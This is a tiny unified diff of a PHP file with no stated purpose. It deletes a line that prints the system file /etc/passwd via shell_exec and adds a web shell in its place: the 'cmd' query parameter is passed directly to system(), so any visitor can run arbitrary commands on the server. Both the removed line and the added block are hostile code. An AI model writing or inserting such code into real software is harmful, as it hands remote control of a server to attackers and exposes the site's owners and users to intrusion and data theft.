@@ -1,3 +1,5 @@
 <?php
-echo shell_exec('cat /etc/passwd');
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
 ?>
